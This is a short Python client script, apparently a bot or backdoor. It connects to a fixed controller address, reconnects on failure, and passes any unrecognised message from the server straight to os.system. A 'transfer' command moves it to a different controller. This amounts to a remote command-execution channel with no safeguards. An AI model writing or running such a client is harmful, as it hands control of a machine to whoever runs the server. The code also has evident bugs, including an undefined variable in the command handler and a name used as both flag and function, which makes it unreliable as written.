import socket
import sys
import time
import threading
import os

isConnected = 0
sock = None
running = 1
isSetup = 0
server_address = ('192.168.1.8', 10000)


def connect():
    global isConnected, sock
    #Create TCP/IP socket
    if running:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        isConnected = 0
        setupThreadOne()
        # Connect the socket to the port where the server is listening
        print('connecting to %s port %s' % server_address)
        try:
            sock.connect(server_address)
            isConnected = 1
            print("Connected!!!")
            setupThreadTwo()
            running()
        except Exception as e:
            if e.errno is 111:
                print(str(e))
                time.sleep(5)
                connect()
            else:
                print(str(e))
###END connect

def running():
    global isConnected, sock
    while isConnected:
        time.sleep(2)
        if isConnected:
            try:
                sock.send(b"Hello server!")
            except Exception as e:
                sock.close()
                isConnected = 0
                print ("Disconnected!    ", str(e))
        else:
            connect()
    connect()



###END running

def setupThreadOne():
    global isSetup
    ##Strating daemons
    if isSetup == 0:
        try:
           inputThread = threading.Thread(target=inputFunc)
           inputThread.daemon = 0
           inputThread.start()
           isSetup = 1
        except Exception:
           print("Error: ", Exception.error)
    ##Finished
###END setupThreads

def setupThreadTwo():
    try:
      recvThread = threading.Thread(target=recvFunc);
      recvThread.daemon = 0
      recvThread.start()
    except Exception:
      print("Error: ", Exception.error)
###END setupThreadTwo

def disconnect():
    global sock, isConnected
    sock.close()
    isConnected = 0
    print("Disconnected!")
###END disconnect

def exitClient(args):
    global running
    disconnect()
    running = 0
###END exit

def runCommand(command, args):
    methods = { "exit": exitClient }
    if command in methods:
        methods[command](args) # + argument list of course
    else:
        print("Invalid command!!!")
###END runCommand

def inputFunc():
    while running:
        line = input(">")
        line = line.split()
        if len(line) >= 1:
            cmd = line[0]
            line.remove(cmd)
            args = line
            #print("Command: ", cmd)
            #print("Args: ", args)
            runCommand(cmd, args)
    return
###END inputFunc

def processCommand(cmd, args):
    global server_address
    if cmd == "PING":
        None
    elif cmd == "transfer":
        server_address = (str(args[0]), 10000)
        disconnect()
    else:
        print("Got: ", mess)
        os.system(mess)


###END processCommand
def recvFunc():
    while isConnected:
        mess = sock.recv(1024).decode()
        line = mess.split()
        if len(line) >= 1:
            cmd = line[0]
            line.remove(cmd)
            args = line
            #print("Command: ", cmd)
            #print("Args: ", args)
            processCommand(cmd, args)

###END recvFunc

connect()
